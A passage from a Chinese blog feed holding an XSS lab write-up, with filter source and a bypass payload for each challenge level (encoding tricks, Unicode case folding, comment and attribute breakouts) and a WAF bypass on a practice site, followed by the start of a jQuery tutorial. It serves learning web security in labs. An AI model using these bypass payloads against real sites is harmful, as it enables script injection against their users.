class="hljs html">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">stripBracketsRe</span> = /[()]/g<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(stripBracketsRe, <span class="hljs-string">&#x27;&#x27;</span>)<br>  <span class="hljs-keyword">return</span> input<br>&#125;<br></code></pre></td></tr></table></figure><p>分析源码可以看出过滤了所有的<code>()</code> 我们可以使用``来代替</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">alert<span class="hljs-string">`1`</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">stripBracketsRe</span> = /[()`]/g<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(stripBracketsRe, <span class="hljs-string">&#x27;&#x27;</span>)<br>  <span class="hljs-keyword">return</span> input<br>&#125;<br></code></pre></td></tr></table></figure><p>这个就是第三题多了个`我们可以使用svg来解决</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x6C;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x72;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x28;</span><span class="hljs-symbol">&amp;#x31;</span><span class="hljs-symbol">&amp;#x29;</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>转换网址在这<a href="https://www.qqxiuzi.cn/bianma/zifushiti.php">https://www.qqxiuzi.cn/bianma/zifushiti.php</a></p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/xss-1.png" alt="image-20220116145138995"></p><h4 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h4><p>考验的是对于注释怎么解决</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(/--&gt;/g, <span class="hljs-string">&#x27;😂&#x27;</span>)<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;!-- &#x27;</span> + input + <span class="hljs-string">&#x27; --&gt;&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可以使用–!&gt;来进行闭合</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">--!&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h4><p>考验的HTML的语法松散性,即换行也可继续赋值,这里他的正则是匹配了所有的auto，on开头&#x3D;结尾还有&gt;都会变被替换为_</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(/auto|on.*=|&gt;/ig, <span class="hljs-string">&#x27;_&#x27;</span>)<br>  <span class="hljs-keyword">return</span> `&lt;input value=<span class="hljs-number">1</span> $&#123;input&#125; type=<span class="hljs-string">&quot;text&quot;</span>&gt;`<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">onclick<br>=&quot;alert(1)&quot;<br></code></pre></td></tr></table></figure><h4 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h4><p>正则,匹配所有的闭合符号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">stripTagsRe</span> = /&lt;\/?[^&gt;]+&gt;/gi<br><br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(stripTagsRe, <span class="hljs-string">&#x27;&#x27;</span>)<br>  <span class="hljs-keyword">return</span> `&lt;article&gt;$&#123;input&#125;&lt;/article&gt;`<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h4><p>这里的正则不太严谨,只屏蔽&lt;&#x2F;style&gt;我们只需要在最后换行就可以躲过了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">src</span>) </span>&#123;<br>  src = src.<span class="hljs-title function_ invoke__">replace</span>(/&lt;\/style&gt;/ig, <span class="hljs-string">&#x27;/* \u574F\u4EBA */&#x27;</span>)<br>  <span class="hljs-keyword">return</span> `<br>    &lt;style&gt;<br>      $&#123;src&#125;<br>    &lt;/style&gt;<br>  `<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;/style<br>&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  let domainRe = /^https?:\/\/www\.segmentfault\.com/<br>  <span class="hljs-keyword">if</span> (domainRe.<span class="hljs-title function_ invoke__">test</span>(input)) &#123;<br>    <span class="hljs-keyword">return</span> `&lt;script src=<span class="hljs-string">&quot;$&#123;input&#125;&quot;</span>&gt;&lt;/script&gt;`<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid URL&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>同样的正则的过滤不太完全,只是匹配以https…………………开头的不管后面的</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">http://www.segmentfault.com&quot; onload=&quot;alert(1)&quot;<br></code></pre></td></tr></table></figure><h4 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escapeHtml</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> s.<span class="hljs-title function_ invoke__">replace</span>(/&amp;/g, <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>)<br>            .<span class="hljs-title function_ invoke__">replace</span>(/<span class="hljs-string">&#x27;/g, &#x27;</span>&amp;#<span class="hljs-number">39</span>;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&quot;/g, &#x27;</span>&amp;quot;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&lt;/g, &#x27;</span>&amp;lt;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&gt;/g, &#x27;</span>&amp;gt;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\//g, &#x27;</span>&amp;#x2f<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">  const domainRe = /^https?:\/\/www\.segmentfault\.com/</span><br><span class="hljs-string">  if (domainRe.test(input)) &#123;</span><br><span class="hljs-string">    return `&lt;script src=&quot;$&#123;escapeHtml(input)&#125;&quot;&gt;&lt;/script&gt;`</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">  return &#x27;</span>Invalid URL<span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><p>这个的过滤就比较好了,过滤了很多特殊字符</p><p>但是我们可以使用https:&#x2F;&#x2F;<a href="mailto:&#46;&#x2e;&#x2e;&#46;&#x2e;&#46;&#46;&#46;&#46;&#46;&#46;&#x40;&#x77;&#119;&#119;&#x2e;&#98;&#97;&#x69;&#100;&#x75;&#x2e;&#x63;&#x6f;&#x6d;">&#46;&#x2e;&#x2e;&#46;&#x2e;&#46;&#46;&#46;&#46;&#46;&#46;&#x40;&#x77;&#119;&#119;&#x2e;&#98;&#97;&#x69;&#100;&#x75;&#x2e;&#x63;&#x6f;&#x6d;</a>这种链接,这个链接的效果是跳转到<a href="http://www.baidu.com前面的东西作为参数/">www.baidu.com前面的东西作为参数</a></p><h4 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.<span class="hljs-title function_ invoke__">toUpperCase</span>()<br>  <span class="hljs-keyword">return</span> `&lt;h1&gt;$&#123;input&#125;&lt;/h1&gt;`<br>&#125;<br></code></pre></td></tr></table></figure><p>将所有的输入都转化为大写,这样我们就用不了alert了,但是我们可以使用svg</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x6C;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x72;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x28;</span><span class="hljs-symbol">&amp;#x31;</span><span class="hljs-symbol">&amp;#x29;</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h4><p>这题他不仅大写还屏蔽了所有的script</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(/script/ig, <span class="hljs-string">&#x27;&#x27;</span>)<br>  input = input.<span class="hljs-title function_ invoke__">toUpperCase</span>()<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/h1&gt;&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这时候就可以使用古英文了,因为toUpperCase()会将古英文转换为现代英文</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span>&lt;ſcript&gt;<span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x6C;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x72;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x28;</span><span class="hljs-symbol">&amp;#x31;</span><span class="hljs-symbol">&amp;#x29;</span>&lt;/ſcript&gt;<br></code></pre></td></tr></table></figure><h4 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(/[&lt;/<span class="hljs-string">&quot;&#x27;]/g, &#x27;&#x27;)</span><br><span class="hljs-string">  return `</span><br><span class="hljs-string">    &lt;script&gt;</span><br><span class="hljs-string">          // alert(&#x27;$&#123;input&#125;&#x27;)</span><br><span class="hljs-string">    &lt;/script&gt;</span><br><span class="hljs-string">  `</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><p>换行跳过,没啥好说的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><br><span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>);<br>--&gt;<br></code></pre></td></tr></table></figure><h4 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(/&lt;([a-zA-Z])/g, <span class="hljs-string">&#x27;&lt;_$1&#x27;</span>)<br>  input = input.<span class="hljs-title function_ invoke__">toUpperCase</span>()<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/h1&gt;&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>屏蔽了&lt;开头的英文字母</p><p>古英文</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;ſvg&gt;&lt;ſcript&gt;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&lt;/ſcript&gt;<br></code></pre></td></tr></table></figure><h4 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escapeHtml</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> s.<span class="hljs-title function_ invoke__">replace</span>(/&amp;/g, <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>)<br>            .<span class="hljs-title function_ invoke__">replace</span>(/<span class="hljs-string">&#x27;/g, &#x27;</span>&amp;#<span class="hljs-number">39</span>;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&quot;/g, &#x27;</span>&amp;quot;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&lt;/g, &#x27;</span>&amp;lt;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&gt;/g, &#x27;</span>&amp;gt;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\//g, &#x27;</span>&amp;#x2f;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">  return `&lt;img src onerror=&quot;console.error(&#x27;</span>$&#123;<span class="hljs-title function_ invoke__">escapeHtml</span>(input)&#125;<span class="hljs-string">&#x27;)&quot;&gt;`</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><p>在onerror&#x3D;””里面的内容貌似会自动识别字符实体转换</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-string">&#x27;);alert(1)//</span><br></code></pre></td></tr></table></figure><h4 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h4><p>没啥好讲的,加个;结束上个语句然后写别的语句就可以了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> `<br>&lt;script&gt;<br>  window.data = $&#123;input&#125;<br>&lt;/script&gt;<br>  `<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-number">1</span>;<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h4 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// from alf.nu</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span> (<span class="hljs-params">s</span>) </span>&#123;<br>  s = s.<span class="hljs-title function_ invoke__">replace</span>(/<span class="hljs-string">&quot;/g, &#x27;\\&quot;</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">  return &#x27;</span>&lt;script&gt;console.<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;&#x27; + s + &#x27;&quot;</span>);&lt;/script&gt;<span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><p>正则是给所有的&quot;替换成\\&quot;</p><p>所以我们在自己写个\去替换掉就行了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">\<span class="hljs-string">&quot;);alert(1);//</span><br></code></pre></td></tr></table></figure><h3 id="练习靶场二"><a href="#练习靶场二" class="headerlink" title="练习靶场二"></a>练习靶场二</h3><p><a href="https://xssaq.com/yx/level1.php">https://xssaq.com/yx/level1.php</a></p><p>第一题略</p><p>第二题</p><p>他给了一个输入框,随便输入点东西然后查看源代码</p><p><img src="/.com//....%5Cpublic%5Cimg%5Cxss-8.png" alt="image-20220116184634174"></p><p>他并没有把input里面的内容给屏蔽</p><p>所以可以直接构造</p><blockquote><p>“ onclick&#x3D;”alert(1)”</p></blockquote><p>第三题</p><p>直接查看源代码,然后测试是否可以闭合</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/xss-2.png" alt="image-20220116184953951"></p><p>发现可以使用单引号闭合,然后自由发挥把</p><p>第三题和第四题一样</p><p>第五题还是弄闭合然后发现 on和script都用不了,于是使用a标签</p><blockquote><p>“&gt;<a href="javascript:alert(1)"></a></p></blockquote><p>第六题和第五题一样就是href变成大写的</p><p>第七题</p><p>1.看源码2.测试脚本,发现script被替换为空了,3.使用双写测试</p><p>然后完成了</p><blockquote><p>“&gt;<scrscriptipt>alert(1)</scrscriptipt></p></blockquote><p>第八题</p><p>前端字符串中可以使用Unicode</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/xss-3.png" alt="image-20220116195303204"></p><p>第九题</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><br>一定要包含http:<span class="hljs-comment">//</span><br>&amp;<span class="hljs-attr">#106</span>;&amp;<span class="hljs-attr">#97</span>;&amp;<span class="hljs-attr">#118</span>;&amp;<span class="hljs-attr">#97</span>;&amp;<span class="hljs-attr">#115</span>;&amp;<span class="hljs-attr">#99</span>;&amp;<span class="hljs-attr">#114</span>;&amp;<span class="hljs-attr">#105</span>;&amp;<span class="hljs-attr">#112</span>;&amp;<span class="hljs-attr">#116</span>;&amp;<span class="hljs-attr">#58</span>;&amp;<span class="hljs-attr">#97</span>;&amp;<span class="hljs-attr">#108</span>;&amp;<span class="hljs-attr">#101</span>;&amp;<span class="hljs-attr">#114</span>;&amp;<span class="hljs-attr">#116</span>;&amp;<span class="hljs-attr">#40</span>;&amp;<span class="hljs-attr">#49</span>;&amp;<span class="hljs-attr">#41</span>;<span class="hljs-comment">//http://</span><br>javascript:alert<span class="hljs-comment">(1)</span><span class="hljs-comment">//http://</span><br></code></pre></td></tr></table></figure><h3 id="小型实战"><a href="#小型实战" class="headerlink" title="小型实战"></a>小型实战</h3><p>http://chanzhi7.njhack.xyz/www/index.php</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/xss-4.png" alt="image-20220116182410449"></p><p>我们要对本网站进行漏洞探查</p><p>首先进行搜索</p><p>输入单引号然后报错,判断有防火墙</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/xss-5.png" alt="image-20220116182804828"></p><p>进行两次url转码然后查看效果,发现通过了</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/xss-6.png" alt="image-20220116182853354"></p><p>然后查看网页源代码,然后分析构造漏洞</p><blockquote><p>‘&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</p></blockquote><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/xss-7.png" alt="image-20220116183059503"></p><p>发现网页已经有改变了,但是还剩没有打到我们效果,查看源码</p><p><img src="/.com//....%5Cpublic%5Cimg%5Cxss-6.png" alt="image-20220116183204588"></p><p>发现&lt;script&gt;被屏蔽,我们再一次用url编码查看结果</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/xss-8.png" alt="image-20220116183331018"></p><p>然后提交成功</p>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全</tag>
      
      <tag>靶场练习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JQuery</title>
    <link href="/2022/01/15/JQuery/"/>
    <url>/2022/01/15/JQuery/</url>
    
    <content type="html"><![CDATA[<h1 id="JQuery"><a href="#JQuery" class="headerlink" title="JQuery"></a>JQuery</h1><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>下载jQuery,然后引入</p><p><a href="https://jquery.com/download/">https://jquery.com/download/</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;jquery.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br></code></pre></td></tr></table></figure><p>或者使用csdn</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://libs.baidu.com/jquery/1.10.2/jquery.min.js&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;external nofollow&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><h4 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h4><p>$(选择的标签元素).要执行的函数</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/jquery-1.png" alt="image-20220115191627241"></p><h4 id="定位元素-选择器"><a href="#定位元素-选择器" class="headerlink" title="定位元素(选择器):"></a>定位元素(选择器):</h4><h5 id="根据标签选择"><a href="#根据标签选择" class="headerlink" title="根据标签选择"></a>根据标签选择</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">$(<span class="hljs-string">&quot;p&quot;</span>).<span class="hljs-title function_">hide</span>();<br><span class="hljs-comment">//选择p标签</span><br></code></pre></td></tr></table></figure><h5 id="根据id选择"><a href="#根据id选择" class="headerlink" title="根据id选择"></a>根据id选择</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">$(<span class="hljs-string">&quot;#lll&quot;</span>).<span class="hljs-title function_">hide</span>()<br><span class="hljs-comment">//选择id为lll的标签</span><br></code></pre></td></tr></table></figure><h5 id="根据class选择"><a href="#根据class选择" class="headerlink" title="根据class选择"></a>根据class选择</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">$(<span class="hljs-string">&quot;.kkk&quot;</span>).<span class="hljs-title function_">hide</span>()<br><span class="hljs-comment">//选择class为kkk的标签</span><br></code></pre></td></tr></table></figure><h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><table><thead><tr><th align="left">语法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">$(“*”)</td><td align="left">选取所有元素</td></tr><tr><td align="left">$(this)</td><td align="left">选取当前 HTML 元素</td></tr><tr><td align="left">$(“p.intro”)</td><td align="left">选取 class 为 intro 的 <p> 元素</p></td></tr><tr><td align="left">$(“p:first”)</td><td align="left">选取第一个 <p> 元素</p></td></tr><tr><td align="left">$(“ul li:first”)</td><td align="left">选取第一个 <ul> 元素的第一个 <li> 元素</li></ul></td></tr><tr><td align="left">$(“ul li:first-child”)</td><td align="left">选取每个 <ul> 元素的第一个 <li> 元素</li></ul></td></tr><tr><td 